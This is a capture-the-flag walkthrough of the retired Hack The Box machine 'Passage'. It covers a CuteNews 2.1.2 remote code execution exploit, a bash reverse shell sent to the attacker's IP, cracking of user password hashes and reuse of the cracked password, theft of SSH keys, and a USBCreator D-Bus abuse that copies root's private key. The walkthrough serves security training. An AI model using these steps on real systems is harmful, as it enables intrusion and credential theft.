# Passage

This is the write-up for the box Passage that got retired at the 6th March 2021.
My IP address was 10.10.14.6 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.206    passage.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/passage.nmap 10.10.10.206
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Passage News
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The website looks like a blog page with one useful article with the title **"Implemented Fail2Ban"**.
In the footer it shows that it is built with [CuteNews](https://cutephp.com/) content management system.

Searching for public vulnerabilities for **CuteNews**:
```
searchsploit cutenews
```
```
(...)
CuteNews 2.1.2 - Remote Code Execution
```

There is a **Remote Code Execution** for version 2.1.2 which is pretty new, so this may work:
```
python3 48800.py

Enter the URL> http://10.10.10.206/
```
```
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: 2XapcXGY49 and password: 2XapcXGY49

=======================================================
Sending Payload
=======================================================
signature_key: b6745348d2518c0a89d60dd9ccdcf733-2XapcXGY49
signature_dsi: 6d82cba8e7f811e131bbf19edc37abc2
logged in user: 2XapcXGY49
============================
Dropping to a SHELL
============================

command > id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

It extracts credentials from the directory _/CuteNews/cdata/users/lines_ that can be cracked later.
Then it registers a user and uploads the avatar with an image which contains the PHP payload and commands can be executed as _www-data_.

This exploit executes every command individually and is not a real shell, so lets use this to start a reverse shell connection:
```
command > bash -c 'bash -i >& /dev/tcp/10.10.14.6/9001 0>&1'
```

After sending the command, the listener on my IP and port 9001 starts a reverse shell as _www-data_.

## Privilege Escalation

In the directory _/var/www/html/CuteNews/cdata/users_ are the credentials of the users, that the exploit found on the web server.
When looking at those, there are two more hashes that were not disclosed on the web directory:
```
for i in $(find . -name "*.php"); do tail -1 $i | base64 -d; echo; done | grep -oP [a-z0-9]{64}
```
```
2d881cd5961343b90086878af823ebf5c4c2b7052c858010bff6c5ef7a7b6889
e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9
```

All hashes can be searched on public hash databases like [CrackStation](https://crackstation.net/) and the cleartext password of three hashes will be found:
- 4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc = egre55
- e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9 = hacker
- e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd = atlanta1

The password _"atlanta1"_ belongs to the only user that exists on the box _paul_, so it could be possible to switch users:
```
su paul
```

It works and logs us in as the user _paul_.

### Privilege Escalation 2

In the home directory of _paul_ is the _.ssh_ directory with a public and a private key from the user _nadav_.

Copying the contents of the private key to our local client and login in as _nadav_:
```
ssh -i nadav.key nadav@10.10.10.206
```

### Privilege Escalation to root

In the home directory of _nadav_ is a _.viminfo_ file that contains some history about what was done with **Vim**:
```
# Command Line History (newest to oldest):
:wq
:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g

(...)

# File marks:
'0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
'1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
```

This user changed the group _root_ to _sudo_ in the _51-ubuntu-admin.conf_ configuration.
There exists a configuration file for **USBCreator**, which is used to create bootable USB devices.

An [article from Palo Alto](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) describes how this can be exploited to escalate privileges and read files that belong to root.

Reading the private SSH of root:
```
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /dev/shm/root.key true

cat /dev/shm/root.key
```

An SSH key exists and its contents can be copied to our local client to login as root!
```
ssh -i root.key 10.10.10.206
```
